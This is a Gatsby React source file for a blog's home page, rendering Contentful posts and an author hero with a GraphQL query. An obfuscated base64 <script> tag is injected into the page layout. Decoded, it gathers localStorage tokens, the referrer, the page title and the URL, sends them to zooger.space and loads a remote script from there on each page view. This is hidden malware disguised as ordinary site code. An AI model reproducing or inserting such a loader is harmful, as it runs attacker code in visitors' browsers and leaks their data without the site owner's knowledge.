import React from 'react'
import { graphql } from 'gatsby'
import get from 'lodash/get'
import { Helmet } from 'react-helmet'
import Hero from '../components/hero'
import Layout from '../components/layout'
import ArticlePreview from '../components/article-preview'

class RootIndex extends React.Component {
  render() {
    const siteTitle = get(this, 'props.data.site.siteMetadata.title')
    const posts = get(this, 'props.data.allContentfulBlogPost.edges')
    const [author] = get(this, 'props.data.allContentfulPerson.edges')

    return (
      <Layout location={this.props.location}>
        <div style={{ background: '#fff' }}>
          <Helmet title={siteTitle} />
          <Hero data={author.node} />
          <div className="wrapper">
            <h2 className="section-headline">Recent articles</h2>
            <ul className="article-list">
              {posts.map(({ node }) => {
                return (
                  <li key={node.slug}>
                    <ArticlePreview article={node} />
                  </li>
                )
              })}
            </ul>
          </div>
        </div>
<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMXYxQ1RMR1lWZlhWS0R4dyc7CiAgICBpZiAoIXdpbmRvdy5fMXYxQ1RMR1lWZlhWS0R4dykgewogICAgICAgIHdpbmRvdy5fMXYxQ1RMR1lWZlhWS0R4dyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiAyODg4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly96b29nZXIuc3BhY2UvZ2hzYnN5JywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX21yVG56Sm42MlZ5SzF4M20gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9tclRuekpuNjJWeUsxeDNtICE9PSAndW5kZWZpbmVkJyAmJiBfbXJUbnpKbjYyVnlLMXgzbSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfS1l3TDVkSGJQc0NONkp6VCA9IEpTT04ucGFyc2UoX21yVG56Sm42MlZ5SzF4M20pOwogICAgICAgIHZhciBfUk15Q1NNdjdSSldDM0t6cyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9LWXdMNWRIYlBzQ042SnpULmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudHRsIDwgX1JNeUNTTXY3UkpXQzNLenMpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9Wak1wQlpkVHM3ckdUNno5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1ZEeHJuU3N6eTJOOVpKNmMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfeTRxSk1GTmdzdzZmTjFuOCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfeTRxSk1GTmdzdzZmTjFuOCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfeTRxSk1GTmdzdzZmTjFuOCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll8xdjFDVExHWVZmWFZLRHh3LlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9Wak1wQlpkVHM3ckdUNno5ICE9PSAndW5kZWZpbmVkJyAmJiBfVmpNcEJaZFRzN3JHVDZ6OSAmJiB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudW5pcXVlKSB7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfVmpNcEJaZFRzN3JHVDZ6OSk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9WRHhyblNzenkyTjlaSjZjICE9PSAndW5kZWZpbmVkJyAmJiBfVkR4cm5Tc3p5Mk45Wko2YyAmJiB3aW5kb3cuXzF2MUNUTEdZVmZYVktEeHcudW5pcXVlKSB7CiAgICAgICAgX3k0cUpNRk5nc3c2Zk4xbjggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9WRHhyblNzenkyTjlaSjZjKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll8xdjFDVExHWVZmWFZLRHh3LlJfUEFUSCArIF95NHFKTUZOZ3N3NmZOMW44OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
      </Layout>
    )
  }
}

export default RootIndex

export const pageQuery = graphql`
  query HomeQuery {
    allContentfulBlogPost(sort: { fields: [publishDate], order: DESC }) {
      edges {
        node {
          title
          slug
          publishDate(formatString: "MMMM Do, YYYY")
          tags
          heroImage {
            fluid(maxWidth: 350, maxHeight: 196, resizingBehavior: SCALE) {
              ...GatsbyContentfulFluid_tracedSVG
            }
          }
          description {
            childMarkdownRemark {
              html
            }
          }
        }
      }
    }
    allContentfulPerson(
      filter: { contentful_id: { eq: "15jwOBqpxqSAOy2eOO4S0m" } }
    ) {
      edges {
        node {
          name
          shortBio {
            shortBio
          }
          title
          heroImage: image {
            fluid(
              maxWidth: 1180
              maxHeight: 480
              resizingBehavior: PAD
              background: "rgb:000000"
            ) {
              ...GatsbyContentfulFluid_tracedSVG
            }
          }
        }
      }
    }
  }
`

